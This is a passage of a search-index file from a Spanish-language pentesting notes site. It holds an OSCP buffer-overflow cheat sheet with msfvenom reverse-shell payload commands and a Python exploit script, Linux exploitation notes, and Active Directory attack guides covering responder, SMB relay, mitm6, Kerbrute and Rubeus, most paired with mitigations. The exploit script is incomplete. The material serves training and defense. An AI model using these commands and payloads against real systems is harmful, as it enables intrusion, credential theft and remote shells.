\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff</code></p>"},{"location":"Cheat%20Sheets/Pwning/bof-oscp/#busqueda-para-ejecucion","title":"B\u00fasqueda para ejecuci\u00f3n","text":"B\u00fasqueda de <code>jmp esp</code> <code>!mona modules</code> Generaci\u00f3n de patr\u00f3n <code>!mona find -s \"\\xff\\xe4\" -m &lt;nombre de dll&gt;</code> Generaci\u00f3n de patr\u00f3n"},{"location":"Cheat%20Sheets/Pwning/bof-oscp/#payload","title":"Payload","text":"Generaci\u00f3n de payload <code>msfvenom -a x86 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai LHOST=&lt;ip&gt; LPORT=&lt;puerto&gt; -b '\\x00' EXITFUNC=thread -i 3 -f python &gt; scode.txt</code> Encoder <code>shikata ga nai</code> <code>msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;puerto&gt; -b '\\x00' EXITFUNC=thread -f python &gt; scode.txt</code> Sin encoder y si iteraciones"},{"location":"Cheat%20Sheets/Pwning/bof-oscp/#exploit-final","title":"Exploit final","text":"<pre><code>from struct import pack\nimport socket, sys\n\nif len(sys.argv) &lt; 2:\n    print \"\\n [!] Uso: python \" + sys.argv[0] + \"&lt;ip-address&gt;\" + \"&lt;remote-port&gt; \\n\"\n    sys.exit(0)\n\nip_address = sys.argv[1]\nrport = int(sys.argv[2])\n\nshellcode =  b\"\"\nshellcode += b\"\\xb8\\x36\\xda\\x75\\x0f\\xda\\xd5\\xd9\\x74\\x24\\xf4\\x5b\\x2b\"\n\n#badchars = ()\n#badchars \\x00\\x23\\x3c\\x83\\xba\n\nif __name__ == \"__main__\":\n   prefix = \"\"\n   offset = 1052\n   filler = \"A\" * offset\n   eip = pack(\"&lt;L\", 0x68a98a7b)\n   nops = \"\\x90\" * 16\n   #nops = \"\\x83\\xEC\\x10\" # sub esp, 0x10\n\n   #payload = prefix + filler + eip + badhchars\n   payload = prefix + filler + eip + nops + shellcode\n\n   try:\n      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n      s.connect((ip_address, rport))\n      s.send(\"%s\\r\\n\" % buffer)\n   except Exception as ex:\n      print \"[!] Ha habido un error de conexion\"\n      print ex\n      sys.exit(1)\n</code></pre>"},{"location":"Cheat%20Sheets/Pwning/linux/","title":"Linux Pwning","text":""},{"location":"Cheat%20Sheets/Pwning/linux/#validaciones-iniciales","title":"Validaciones iniciales","text":"Herramienta Protecci\u00f3n Valor Descripci\u00f3n <code>file</code> not stripped NA Indica que al hacer ingenieria inversa no se podr\u00e1 ver el nombre de las funciones, etc. <code>checksec</code> PIE PIE {enabled, disabled} Cada vez que el programa se ejecute, contar\u00e1 con diferentes direcciones en memoria. <code>checksec</code> NX NX {enabled, disabled} Si esta deshabilitado indica que si se llegase a tener la capacidad de inyectar codigo en la pila se podr\u00e1 ejecutar. <code>checksec</code> Stack CANARY Canary found | No canary found Si se encuentra habilitado, las funciones cuentan con un valor aleatorio asignado si este valor se ve modificado el binario mostrar\u00e1 un mensaje de tipo <code>stack smashing detected</code>. <code>checksec</code> RELRO {Full, PARTIAL} RELRO Indica la capacidad que se tiene para la lectura y escritura. *TODO: Verificar mas adelante <p>Usualmente el llamar directamente a la pila no retorna una shell, por lo que hay que buscar instrucciones de tipo <code>jmp</code> y <code>call</code>, pudiendo hacer un filtrado de estas instrucciones con <code>grep</code>. Ejemplo: <code>objdump -d [binario] | grep jmp</code>. Teniendo en cuenta que deber\u00edan apuntar a los ROP Gadgets ya sea de 32 o 64 bits respectivamente.</p> <pre><code>jmp: ff e0 (hexadecimal) *%rax\ncall: ff d0 (hexadecimal) *%rax\n</code></pre> <p>Para sacar offset en gdb:</p> <ul> <li>Setear breakpoint antes de que termine el programa</li> <li>Ejecutar:</li> </ul> <pre><code>info frame\n\nx/24wx $rsp\n\np/d rip - rsp\n</code></pre>"},{"location":"Cheat%20Sheets/Pwning/linux/#debugging-local","title":"Debugging Local","text":""},{"location":"Cheat%20Sheets/Pwning/linux/#consideraciones","title":"Consideraciones","text":"<p>Para debuggear localmente un binario tener en cuenta la protecci\u00f3n <code>ASLR</code>. - Para deshabilitar: <code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code> - Para habilitar: <code>echo 2 | sudo tee /proc/sys/kernel/randomize_va_space</code> - Para deshabilitar permanentemente, es necesario configurarlo en <code>sysctl</code>. Agregar el archivo <code>/etc/sysctl.d/01-disable-aslr.conf</code> con el contenido: <code>kernel.randomize_va_space = 0</code></p>"},{"location":"Cheat%20Sheets/Pwning/linux/#gdb","title":"GDB","text":"<p>set disassembly-flavor intel</p>"},{"location":"Cheat%20Sheets/Pwning/linux/#script-de-exploit-base","title":"Script de exploit base","text":"<p>TODO</p>"},{"location":"Cheat%20Sheets/Pwning/linux/#tips-n-tricks","title":"Tips n' tricks","text":""},{"location":"Cheat%20Sheets/Pwning/linux/#getenvvarc","title":"getenvvar.c","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nint main(int argc, char *argv[]) {\n   char *ptr;\n\n   if(argc &lt; 3) {\n      printf(\"Usage: %s &lt;environment var&gt; &lt;target program name&gt;\\n\", argv[0]);\n      exit(0);\n   }\n   ptr = getenv(argv[1]); /* Get env var location. */\n   ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */\n   printf(\"%s will be at %p\\n\", argv[1], ptr);\n}\n</code></pre>"},{"location":"Gu%C3%ADas/Active%20Directory/0_general/","title":"Teor\u00eda General","text":""},{"location":"Gu%C3%ADas/Active%20Directory/0_general/#indice","title":"\u00cdndice","text":"<ul> <li>\u00bfQu\u00e9 es?</li> <li>\u00bfPor qu\u00e9?</li> <li>Componentes F\u00edsicos</li> <li>Domain Controller</li> <li>AD DS Data Store (Active Directory Domain Services)</li> <li>Componentes L\u00f3gicos</li> <li>AD DS Schema</li> <li>Domains</li> <li>Trees</li> <li>Forests</li> <li>Organizational Units (OUs)</li> <li>Trusts</li> <li>Objects</li> <li>Referencias</li> </ul>"},{"location":"Gu%C3%ADas/Active%20Directory/0_general/#que-es","title":"\u00bfQu\u00e9 es?","text":"<ul> <li>Es un servicio de directorio desarrollado por Microsoft para gestionar dominios de red.</li> <li>Guarda informaci\u00f3n relacionada con objetos, como computadoras, usuarios, impresoras, etc.<ul> <li>Se puede visualizar como un directorio telef\u00f3nico.</li> </ul> </li> <li>Se autentica usando tickets de Kerberos.<ul> <li>En dispostivos que no tengan Windoes, como m\u00e1quinas con Linux, firewalls, etc. se pueden autenticar al Active Directory v\u00eda RADIUS o LDAP.</li> </ul> </li> </ul>"},{"location":"Gu%C3%ADas/Active%20Directory/0_general/#por-que","title":"\u00bfPor qu\u00e9?","text":"<ul> <li>Es el servicio de gesti\u00f3n de identidades m\u00e1s usado en el mundo.<ul> <li>Se encuentra implementado en la red de numerosas compa\u00f1ias como servicio.</li> </ul> </li> <li>Puede ser explotado sin siquiera atacar exploits que pueden ser parcheables.<ul> <li>En vez de eso se abusan caracter\u00edsticas, confianza, componentes, entre otras cosas.</li> </ul> </li> </ul>"},{"location":"Gu%C3%ADas/Active%20Directory/0_general/#componentes-fisicos","title":"Componentes F\u00edsicos","text":""},{"location":"Gu%C3%ADas/Active%20Directory/0_general/#domain-controller","title":"Domain Controller","text":"<ul> <li>Cuenta con una copia de la colecci\u00f3n del directorio.</li> <li>Provee servicios de autenticaci\u00f3n y autorizaci\u00f3n.</li> <li>Replica actualizaciones a otros domain controllers en el dominio y bosque.</li> <li>Brinda acceso administrativo para gestionar cuentas de usuario y recursos de red.</li> </ul>"},{"location":"Gu%C3%ADas/Active%20Directory/0_general/#ad-ds-data-store-active-directory-domain-services","title":"AD DS Data Store (Active Directory Domain Services)","text":"<ul> <li>Contiene la base de datos de archivos y procesos y gestiona la informaci\u00f3n del directorio de usuarios, servicios y aplicaciones.</li> <li>Consiste en el archivo <code>Ntds.dit</code>.</li> <li>Almacenado predeterminadamente en el directorio <code>%SystemRoot%\\NTDS</code> en todos los domain controllers.</li> <li>Siendo s\u00f3lo accesible a trav\u00e9s de procesos y protocoles del domain controller.</li> </ul>"},{"location":"Gu%C3%ADas/Active%20Directory/0_general/#componentes-logicos","title":"Componentes L\u00f3gicos","text":""},{"location":"Gu%C3%ADas/Active%20Directory/0_general/#ad-ds-schema","title":"AD DS Schema","text":"<ul> <li>Define cada tipo de objeto que puede ser guardado en el directorio.</li> <li>Hace cumplir reglas respecto a la creaci\u00f3n de objetos y configuraci\u00f3n.</li> </ul> Tipos de objetos Funci\u00f3n Ejemplos Class Object Que objetos pueden ser creados en el directorio - Usuario \u2192 Computadora Attribute Object Informaci\u00f3n que puede ser enlazada a un objeto - Nombre a desplegar"},{"location":"Gu%C3%ADas/Active%20Directory/0_general/#domains","title":"Domains","text":"<ul> <li>Son usados para agrupar y gestionar objetos en una organizaci\u00f3n.</li> <li>Per\u00edmetro administrativo para aplicar pol\u00edticas a grupos de objetos.</li> <li>Per\u00edmetro de replicaci\u00f3n para replicar data entre domain controllers.</li> <li>Per\u00edmetro de autenticaci\u00f3n y autorizaci\u00f3n que provee una forma de limitar el alcance del acceso a recursos.</li> </ul>"},{"location":"Gu%C3%ADas/Active%20Directory/0_general/#trees","title":"Trees","text":"<ul> <li>Un domain tree es una jerarqu\u00eda de dominios dentro de el AD DS.</li> <li>Comparte el namespace con el dominio padre.</li> <li>Puede tener dominios hijos adicionales.</li> <li>Predeterminadamente crea confianza transitiva de dos v\u00edas con otros dominios.</li> </ul>"},{"location":"Gu%C3%ADas/Active%20Directory/0_general/#forests","title":"Forests","text":"<ul> <li>Es una colecci\u00f3n de uno o m\u00e1s domain trees.</li> <li>Comparte un schema com\u00fan.</li> <li>Comparte una partici\u00f3n de configuraci\u00f3n com\u00fan.</li> <li>Comparte un cat\u00e1logo global com\u00fan para habilitar b\u00fasquedas.</li> <li>Habilita confianza entre todos los dominios en el forest.</li> <li>Comparte los Enterprise Admins y los grupos de Schema Admins.</li> </ul>"},{"location":"Gu%C3%ADas/Active%20Directory/0_general/#organizational-units-ous","title":"Organizational Units (OUs)","text":"<ul> <li>Son contenedores del Active Directory que pueden contener usuarios, grupos, computadoras y otros OUs.</li> <li>Representa la organizaci\u00f3n logica y jer\u00e1rquicamente.</li> <li>Gestiona de consistentemente colecciones de objetos.</li> <li>Delega permisos para administrar grupos de objetos.</li> <li>Aplica pol\u00edticas.</li> </ul>"},{"location":"Gu%C3%ADas/Active%20Directory/0_general/#trusts","title":"Trusts","text":"<ul> <li>Provee un mecanismo para que los usuarios obtengan acceso a recursos en otro dominio.</li> </ul> Tipos de Trusts Descripci\u00f3n Diagrama Direccional La direcci\u00f3n de confianza fluye de dominio de confianza a dominio de confianza. Transitivo La relaci\u00f3n de confianza es extendida m\u00e1s all\u00e1 de la relaci\u00f3n de confianza de dos dominios, incluyendo otros dominios en los que se conf\u00eda <ul> <li>Todos los dominios de un bosque conf\u00edan en otros dominios del bosque.</li> <li>La confianza puede ser extendida afuera del bosque.</li> </ul>"},{"location":"Gu%C3%ADas/Active%20Directory/0_general/#objects","title":"Objects","text":"Objeto Descripci\u00f3n User - Habilita acceso a recursos de red a un usuario InetOrgPerson - Similar a la cuenta de usuario  - Usado para brindar compatibilidad a otros servicios de directorios Contacts - Usado principalmente para asignar direcciones de e-mail a usuarios externos  - No habilita acceso a la red Groups - Usado para simplificar la administraci\u00f3n de control de acceso Computers - Habilita autenticaci\u00f3n y auditor\u00eda de acceso inform\u00e1tico a los recursos Printers - Usado para simplificar el proceso de ubicaci\u00f3n y conexi\u00f3n a impresoras Shared folders - Permite a los usuarios la b\u00fasqueda de carpetas compartidas bas\u00e1ndose en sus propiedades"},{"location":"Gu%C3%ADas/Active%20Directory/0_general/#referencias","title":"Referencias","text":"<ul> <li>Microsoft Virtual Academy.</li> </ul>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/","title":"Ataques","text":""},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#indice","title":"\u00cdndice","text":"<ul> <li>LLMNR Poisoning</li> <li>\u00bfQu\u00e9 es LLMNR?</li> <li>Ejecuci\u00f3n</li> <li>Defensas</li> <li>SMB Relay</li> <li>\u00bfQu\u00e9 es?</li> <li>Requisitos</li> <li>Ejecuci\u00f3n</li> <li>Estrategias de mitigaci\u00f3n</li> <li>IPv6 Attacks</li> <li>IPv6 DNS Takeover<ul> <li>Ejecuci\u00f3n</li> </ul> </li> <li>Estrategias de mitigaci\u00f3n</li> <li>Estrategias/proceso de pentesting a ambiente</li> <li>Post-Explotaci\u00f3n</li> <li>Enumeraci\u00f3n<ul> <li>PowerView</li> <li>BloodHound</li> <li>Recopilaci\u00f3n</li> <li>Carga de informaci\u00f3n</li> </ul> </li> <li>Ataques<ul> <li>Privilege Requirements</li> <li>Abusing Pre-Authentication</li> <li>Kerbrute</li> <li>Harvesting \\&amp; Brute-Forcing Tickets</li> <li>Rubeus</li> <li>Harvesting</li> <li>Brute-Forcing | Password-Spraying</li> <li>Kerberoasting</li> <li>Ejecuci\u00f3n - Rubeus</li> <li>Ejecuci\u00f3n - Impacket</li> <li>Crackeo</li> <li>\u00bfQu\u00e9 puede hacer una cuenta de servicio?</li> <li>Mitigaci\u00f3n</li> <li>AS-REP Roasting</li> <li>Overview</li> <li>Ejecuci\u00f3n - Rubeus</li> <li>Ejecuci\u00f3n - Impacket</li> <li>Crackeo</li> <li>Mitigaci\u00f3n</li> <li>Pass The Ticket</li> <li>Overview</li> <li>Ejecuci\u00f3n</li> <li>Mitigaci\u00f3n</li> <li>Pass The Hash</li> <li>Dumpeo de hashes</li> <li>Mitigaciones</li> <li>Token Impersonation</li> <li>Ejecuci\u00f3n<ul> <li>Metasploit</li> <li>Non-metasploit</li> </ul> </li> <li>Mitigaci\u00f3n</li> <li>Group Policy Preferences (GPP) - AKA MS14-025</li> <li>Ejecuci\u00f3n</li> <li>Mimikatz</li> <li>Credential Dumping</li> <li>Golden/Silver Tickets</li> <li>KRBTGT Overview</li> <li>Attack Overview</li> <li>Ejecuci\u00f3n</li> <li>Kerberos Backdoors</li> <li>Skeleton Key Overview</li> <li>Ejecuci\u00f3n</li> <li>Abusando de ACLs/ACEs</li> <li>ReadGMSAPassword</li> </ul> </li> <li>Referencias</li> </ul>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#llmnr-poisoning","title":"LLMNR Poisoning","text":""},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#que-es-llmnr","title":"\u00bfQu\u00e9 es LLMNR?","text":"<ul> <li>Link-Local Multicast Name Resolution (\"Pr\u00e1cticamente\" se podr\u00eda considerar DNS).</li> <li>Usado para identificar hosts cuando falla en esa tarea el DNS.</li> <li>Anteriormente conocido como NBT-NS.</li> <li>La falla principal es que los servicios ocupan un nombre de usuario del sistema operativo y un hash NTLMv2 a los cuales responden.</li> </ul>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#ejecucion","title":"Ejecuci\u00f3n","text":"<ul> <li>Ejecutar responder (herramienta de impacket) <code>responder -I tun0 -rdw -v</code>.</li> </ul> <ul> <li>Evento ocurre.</li> </ul> <ul> <li>Obtener hashes.</li> </ul> <ul> <li>Crackeo de hashes <code>hashcat -m 5600 hashes.txt rockyou.txt</code>.</li> </ul>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#defensas","title":"Defensas","text":"<p>La mejor defensa para este escenario es deshabilitar LLMNR y NBT-NS:</p> <ul> <li>Para deshabilitar LLMNR, se debe seleccionar \"Turn OFF Multicast Name Resolution\" en <code>Local Computer Policy &gt; Computer Configuration &gt; Administrative Templates &gt; Network &gt; DNS Client en el Group Policy Editor</code></li> <li>Para deshabilitar NBT-NS, se requiere navegar a <code>Network Connections &gt; Network Adapter Properties &gt; TCP/IPv4 Properties &gt; Advanced tab &gt; WINS tab y seleccionar \"Disable NetBIOS over TCP/IP\"</code>.</li> </ul> <p>En una compa\u00f1ia en donde es necesario usarse o no se puede deshabilitar LLMNR/NBT-NS, lo mejor que se puede realizar es:</p> <ul> <li>Requerir Network Access Control.</li> <li>Requerir contrase\u00f1as de usuario fuertes (ejemplo, 14+ car\u00e1cteres de longitud y l\u00edmite de uso de palabras com\u00fanes). Entre m\u00e1s larga y compleja la contrase\u00f1a, m\u00e1s dif\u00edcil ser\u00e1 crackear el hash.</li> </ul>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#smb-relay","title":"SMB Relay","text":""},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#que-es","title":"\u00bfQu\u00e9 es?","text":"<p>En vez de buscar crackear los hashes obtenidos con responder, en su lugar se pueden retransmitir a m\u00e1quinas en espec\u00edfico y potencialmente obtener acceso.</p>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#requisitos","title":"Requisitos","text":"<ul> <li>SMB signing se debe encontrar deshabilitado en el objetivo.</li> <li>Las credenciales de usuario retransmitidas deber\u00e1n ser de un administrador de la m\u00e1quina.</li> </ul>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#ejecucion_1","title":"Ejecuci\u00f3n","text":"<ul> <li>Modificar <code>responder.conf</code>.</li> </ul> <ul> <li> <p>Ejecutar responder <code>responder.py -I tun0 -rdw -v</code>.</p> </li> <li> <p>Configurar relay a utilizar <code>impacket-ntlmrelayx -tf targets.txt -smb2support</code>.</p> </li> </ul> <p></p> <ul> <li>Evento ocurre.</li> </ul> <p></p> <ul> <li>Win (Pass the hash o Cracking).</li> </ul> <p></p>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#estrategias-de-mitigacion","title":"Estrategias de mitigaci\u00f3n","text":"<ul> <li>Habilitar SMB Signing en todos los dispositivos.<ul> <li>Ventaja: Para completamente el ataque.</li> <li>Desventaja: Puede causar problemas de rendimiento con transferencia de archivos.</li> </ul> </li> <li>Deshabilitar autenticaci\u00f3n NTLM en la red.<ul> <li>Ventaja: Para completamente el ataque.</li> <li>Desventaja: Si Kerberos deja de funcionar, Windows regresa por default a NTLM.</li> </ul> </li> <li>Gestionar nivel de cuentas.<ul> <li>Ventaja: Limita a los administradores de dominio a tareas espec\u00edficas (ejemplo, permiti\u00e9ndoles loguearse s\u00f3lo a servidores de dominio, etc.).</li> <li>Desventaja: Hacer cumplir la pol\u00edtica podr\u00eda resultar dif\u00edcil.</li> </ul> </li> <li>Restricci\u00f3n de administrador local.<ul> <li>Ventaja: Puede prevenir el movimiento lateral.</li> <li>Desventaja: Potencial incremento de la cantidad de tickets de service desk.</li> </ul> </li> </ul>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#ipv6-attacks","title":"IPv6 Attacks","text":""},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#ipv6-dns-takeover","title":"IPv6 DNS Takeover","text":"<p>La forma de ejecutar se basa en la herramienta mitm6, la cual abusa la configuraci\u00f3n por defecto de Windows para tomar el control del servidor DNS predeterminado. Haci\u00e9ndolo mediante replicaci\u00f3n de mensajes por medio de DHCPv6, proveyendo a la v\u00edctimas un enlace local con una direcci\u00f3n IPv6 y configurando a los hosts atacantes como servidor DNS por defecto. Como servidor DNS, <code>mitm6</code> selectivamente replicar\u00e1 las consultas DNS de los atacantes, eligiendo y redirigiento el tr\u00e1fico v\u00edctima a la m\u00e1quina del atacante en lugar del servidor leg\u00edtimo. En esta entrada del blog se puede encontrar una explicaci\u00f3n completa del ataque. <code>mitm6</code> est\u00e1 dise\u00f1ada para trabajar en conjunto con <code>ntlmrelayx</code> de impacket para suplantaci\u00f3n de WPAD y retransmisi\u00f3n de credenciales.</p>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#ejecucion_2","title":"Ejecuci\u00f3n","text":"<p>Es importante se\u00f1alar que en el ambiente debe estar habilitado <code>LDAPS</code>, en la mayor\u00eda de los ambientes se encuentra habilitado.</p> <ol> <li>Ejecutar mitm6 indicando el dominio <code>mitm6 -d dsouls.local</code>.</li> <li>Ejecutar ntlmrelayx indicando ip de domain controller, WPAD y loot (en caso de querelo) <code>impacket-ntlmrelayx -6 -t ldaps://192.168.111.149 -wh fakewpad.dsouls.local -l lootme</code>.</li> <li>A la hora de efectuarse, la informaci\u00f3n recopilada se almacenara en la carpeta indicada para loot.</li> </ol> <p></p> <p></p> <ol> <li>Si llegar\u00e1 autenticarse un administrador de dominio se ejecutar\u00e1 un alta de usuario nuevo con contrase\u00f1a indicada en el log de <code>ntlmrlayx</code>.</li> </ol> <p></p>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#estrategias-de-mitigacion_1","title":"Estrategias de mitigaci\u00f3n","text":"<ol> <li>El envenamiento por IPv6 abusa el hecho de que Windows consulta por una direcci\u00f3n IPv6 incluso en ambientes donde s\u00f3lo est\u00e1 habilitado IPv4. Si internamente no se usa IPv6, la forma m\u00e1s segura de prevenir <code>mitm6</code> es bloqueando tr\u00e1fico DHCPv6 y anuncios entrantes del router en el Firewall de Windows v\u00eda Group Policy. Deshabilitar IPv6 completamente podr\u00eda traer consigo efectos secundarios no deseados. Configurando las siguientes reglas para bloquear en vez de permitir, previene que el ataque funcione.<ul> <li>(Inbound) Core Networking - Dynamic Host Configuration Protocol for IPv6 (DHCPV6-In).</li> <li>(Inbound) Core Networking - Router Advertisement (ICMPv6-In).</li> <li>(Outbound) Core Networking - Dynamic Host Configuration Protocol for IPv6 (DHCPV6-Out).</li> </ul> </li> <li>Si WPAD no es usado internamente, deshabilitarlo v\u00eda Group Policy y deshabilitar el servicio WinHttpAutoProxySvc.</li> <li>Retransmisi\u00f3n a LDAP y LDAPS s\u00f3lo puede ser mitigada habilitando LDAP singning y LDAP channel binding.</li> <li>Considerar etiquetar/mover a los usuarios administrativos al grupo de Protected Users o marcarlos como una Cuenta, es sensible y no puede delegarse, lo que prevendr\u00e1 la impersonificaci\u00f3n de ese usuario v\u00eda delegaci\u00f3n.</li> </ol>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#estrategiasproceso-de-pentesting-a-ambiente","title":"Estrategias/proceso de pentesting a ambiente","text":"<ul> <li>Inicial el d\u00eda con <code>mitm6</code> o <code>responder</code>.</li> <li>Ejecutar escaneos para generar tr\u00e1fico.</li> <li>Si los escaneos est\u00e1n tardando mucho, buscar sitios web dentro dle alcance (http_version - m\u00f3dulo de metasploit).</li> <li>Buscar credenciales por default en logins web:</li> <li>Impresoras.</li> <li>Jenkins.</li> <li>Etc.</li> <li>Pensar fuera de la caja.</li> </ul>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#post-explotacion","title":"Post-Explotaci\u00f3n","text":""},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#enumeracion","title":"Enumeraci\u00f3n","text":""},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#powerview","title":"PowerView","text":"<p>Tabla de comandos relevantes, verificar documentaci\u00f3n y/o cheatsheet anexada.</p> <ul> <li><code>Get-NetDomain</code>: Obtiene informaci\u00f3n del dominio.</li> </ul> <p></p> <ul> <li><code>Get-NetDomainController</code>: Identifica y obtiene informaci\u00f3n de los controladores de dominio.</li> </ul> <p></p> <ul> <li><code>Get-DomainPolicy</code>: Obtiene las pol\u00edticas del dominio.</li> </ul> <p></p> <ul> <li><code>Get-NetUser</code>: Obtiene informaci\u00f3n acerca de los usuarios (considerar la propiedad <code>logoncount</code> podr\u00eda existir la posibilidad que se encuentren usuarios HoneyPot).</li> </ul> <p></p> <ul> <li><code>Get-NetComputer</code>: Obtiene toda la informaci\u00f3n de las computadoras enroladas en el dominio.</li> </ul> <p></p> <ul> <li><code>Invoke-ShareFinder</code>: Realiza un b\u00fasqueda de las carpetas compartidas por medio de smb.</li> </ul> <p></p> <ul> <li><code>Get-NetGPO</code>: Obtiene infomaci\u00f3n de todas las Group Policies.</li> </ul> <p></p>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#bloodhound","title":"BloodHound","text":""},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#recopilacion","title":"Recopilaci\u00f3n","text":"<p>Recopilaci\u00f3n de informaci\u00f3n con <code>SharpHound.ps1</code> disponible en el repositorio oficial de BloodHound de recolectores.</p> <pre><code>Invoke-BloodHound -CollectionMethod All -Domain DSOULS.local -ZipFileName file.zip\n</code></pre> <p>Nota: Dentro de los recolectores disponibles espec\u00edficamente de <code>SharpHound.ps1</code> y <code>SharpHound.exe</code> se han notado diferencias en como es graficada y recopilada la informaci\u00f3n, por lo que durante el recopilado de informaci\u00f3n se sugiere realizar dos recopilados, ejecutando <code>SharpHound.exe</code> sin ning\u00fan par\u00e1metro y <code>SharpHound.ps1</code> o <code>SharpHound.exe</code> espec\u00edficando los m\u00e9todos de recolecci\u00f3n (<code>CollectionMethod</code>, etc.).</p>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#carga-de-informacion","title":"Carga de informaci\u00f3n","text":"<ul> <li>Seleccionar <code>Upload Data</code> ubicado en el men\u00fa de la derecha de BloodHound y seleccionar el zip extra\u00eddo.</li> </ul> <ul> <li>Al terminar la carga del zip se podr\u00e1 visualizar la informaci\u00f3n recopilada, exponiendo rutas potenciales de escalaci\u00f3n y como ejecutarlas.</li> </ul>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#ataques_1","title":"Ataques","text":""},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#privilege-requirements","title":"Privilege Requirements","text":"<ul> <li>Kerbrute Enumeration - No es necesario el acceso al dominio.</li> <li>Pass the Ticket - Es necesario el acceso a un usuario del dominio.</li> <li>Kerberoasting - Es necesario el acceso de cualquier usuario.</li> <li>AS-REP Roasting - Es necesario el acceso de cualquier usuario.</li> <li>Golden Ticket - Es necesario acceso completo al dominio (domain admin).</li> <li>Silver Ticket - Es necesario un hash de servicio.</li> <li>Skeleton Key - Es necesario acceso completo al dominio (domain admin).</li> </ul> <p>Nota: antes de iniciar cualquier testeo es necesario registrar el nombre de dominio en la m\u00e1quina (<code>/etc/hosts</code>), de lo contrario se esperar\u00eda un comportamiento no esperado o simplemente no funcionar.</p>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#abusing-pre-authentication","title":"Abusing Pre-Authentication","text":"<p>Al ejecutar fuerza bruta a la pre-autenticaci\u00f3n de Kerberos, no se disparan eventos de error de autenticaci\u00f3n (en el logueo), lo que se convertir\u00eda en indicadores para el blue team. Cuando se realiza fuerza bruta a trav\u00e9s de Kerberos, se puede realizar mandando s\u00f3lo un frame UDP al KDC permiti\u00e9ndonos enumerar usuarios.</p>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#kerbrute","title":"Kerbrute","text":"<p>Para encontrar posibles usuarios a usar para obtener acceso a la red, se puede hacer uso de Kerbrute haciendo uso de una lista preestablecida de usuarios a probar.</p> <pre><code>./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local users.txt\n</code></pre> <p></p>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#harvesting-brute-forcing-tickets","title":"Harvesting &amp; Brute-Forcing Tickets","text":""},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#rubeus","title":"Rubeus","text":"<p>Rubeus cuenta con una amplia gama de ataques y caracter\u00edsticas que la permiten ser una herramienta muy vers\u00e1til para realizar ataques contra Kerberos. Dentro de las herramientas y ataques que incluye se encuentran overpass the hash, renovaci\u00f3n y requests de tickets, gesti\u00f3n de tickets, extracci\u00f3n de tickets, harvesting, pass the ticket, AS-REP Roasting y Kerberoasting.</p> <p>Repositorio de Rubeus.</p> <p>Repositorio de binarios de Rubeus.</p>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#harvesting","title":"Harvesting","text":"<p>Haciendo uso del comando:</p> <pre><code>Rubeus.exe harvest /interval:30\n</code></pre> <p>Rubeus recopilar\u00e1 TGTs cada 30 segundos.</p> <p></p>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#brute-forcing-password-spraying","title":"Brute-Forcing | Password-Spraying","text":"<p>Rubeus puede ser usado para hacer fuerza bruta de contrase\u00f1as como para hacer password spraying en las cuentas.</p> <p>Este ataque tomar\u00e1 la contrase\u00f1a basada en Kerberos y realizar un spray en todos los usuarios encontrados proporcionando un ticket <code>.kirbi</code>. Este ticket es un TGT que puede ser usado para obtener tickets de servicio del KDC as\u00ed como usarlo en los ataques as\u00ed como el ataque pass the ticket.</p> <p>Antes de ejecutar un spray de contrase\u00f1as se necesita a\u00f1adir el nombre de dominio al archivo de host de windows usando:</p> <pre><code>echo 10.10.116.144 CONTROLLER.local &gt;&gt; C:\\Windows\\System32\\drivers\\etc\\hosts\n</code></pre> <p>Ejecutando:</p> <pre><code>.\\Rubeus.exe brute /password:Password1 /noticket\n</code></pre> <p>Se usar\u00e1 la contrase\u00f1a prove\u00edda y realizar\u00e1 un spray a todos los usuarios que se encuentren y con esto se obtendr\u00e1 un TGT <code>.kirbi</code> para ese usuario.</p> <p></p> <p>Considerar la ejecuci\u00f3n del ataque ya que puede ocasionar el bloqueo de cuentas, dependiendo de las pol\u00edticas de las cuentas.</p>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#kerberoasting","title":"Kerberoasting","text":"<p>Kerberos in a nutshell:</p> <ol> <li>Cuando un usuario se loguea en el Active Directory, el usuario se autentica contra el Domain Controller (DC) usando su 